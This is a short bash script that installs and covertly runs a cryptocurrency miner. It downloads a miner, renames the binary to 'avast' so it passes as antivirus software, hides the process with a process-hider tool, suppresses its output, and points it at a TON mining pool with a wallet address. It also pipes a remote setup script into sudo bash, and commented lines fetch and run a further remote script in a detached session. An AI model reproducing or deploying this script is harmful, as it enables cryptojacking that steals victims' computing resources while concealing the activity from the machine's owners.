#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install curl

apt install screen -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider

wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 

tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz  >/dev/null 2>&1

mv danila-miner avast >/dev/null 2>&1

rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

#wget https://raw.githubusercontent.com/renilo/bc/main/pro.sh >/dev/null 2>&1

#chmod +x pro.sh >/dev/null 2>&1

#screen -dmS Running ./pro.sh

sudo ph add avast

./avast run https://ton-pool-server-p3agi.ondigitalocean.app EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
